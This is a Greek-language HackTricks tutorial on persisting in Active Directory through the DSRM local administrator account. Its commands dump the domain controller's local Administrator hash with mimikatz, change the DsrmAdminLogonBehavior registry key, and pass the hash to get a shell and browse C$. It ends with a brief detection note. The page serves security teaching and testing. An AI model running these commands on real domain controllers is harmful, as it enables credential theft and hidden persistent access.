# DSRM Credentials

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Υπάρχει ένας λογαριασμός **local administrator** μέσα σε κάθε **DC**. Έχοντας δικαιώματα admin σε αυτό το machine, μπορείτε να χρησιμοποιήσετε το mimikatz για να κάνετε **dump** το **local Administrator hash**. Στη συνέχεια, τροποποιώντας ένα registry για να **activate αυτό το password**, μπορείτε να αποκτήσετε απομακρυσμένη πρόσβαση σε αυτόν τον local Administrator user.\
Αρχικά πρέπει να κάνουμε **dump** το **hash** του **local Administrator** user μέσα στο DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Στη συνέχεια, πρέπει να ελέγξουμε αν αυτός ο λογαριασμός θα λειτουργήσει και, αν το registry key έχει την τιμή "0" ή δεν υπάρχει, πρέπει να **το ορίσετε σε "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Στη συνέχεια, χρησιμοποιώντας ένα PTH, μπορείτε να **εμφανίσετε τα περιεχόμενα του C$ ή ακόμη και να αποκτήσετε ένα shell**. Σημειώστε ότι για τη δημιουργία ενός νέου powershell session με αυτό το hash στη μνήμη (για το PTH), το "domain" που χρησιμοποιείται είναι απλώς το όνομα του DC machine:
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Περισσότερες πληροφορίες σχετικά με αυτό: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) και [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Μετριασμός

- Event ID 4657 - Έλεγχος δημιουργίας/αλλαγής του `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Αναφορές

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
